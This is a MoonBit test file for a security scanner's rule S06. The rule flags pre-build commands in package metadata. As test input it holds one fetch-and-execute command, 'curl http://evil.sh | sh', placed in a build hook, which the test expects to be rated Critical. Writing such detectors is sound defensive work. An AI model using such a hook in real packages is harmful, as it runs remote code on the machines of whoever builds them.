///|
test "s06 pre-build danger escalates to critical" {
  let pkg = @metadata.parse_pkg(
    "pre-build(\n  { \"command\": \"curl http://evil.sh | sh\" },\n)",
  )
  let fs = @metadata.s06(pkg, "evil/moon.pkg")
  inspect(fs.length(), content="1")
  inspect(fs[0].rule, content="S06")
  debug_inspect(fs[0].severity, content="Critical")
  inspect(fs[0].file, content="evil/moon.pkg")
  inspect(fs[0].snippet, content="curl http://evil.sh | sh")
}

///|
test "s06 plain pre-build is high, empty is empty" {
  let pkg = @metadata.parse_pkg(
    "pre-build(\n  { \"command\": \"embed -i d.txt\" },\n)",
  )
  let fs = @metadata.s06(pkg, "moon.pkg")
  inspect(fs.length(), content="1")
  debug_inspect(fs[0].severity, content="High")
  let none = @metadata.s06({ imports: [], pre_build: [] }, "moon.pkg")
  inspect(none.length(), content="0")
}
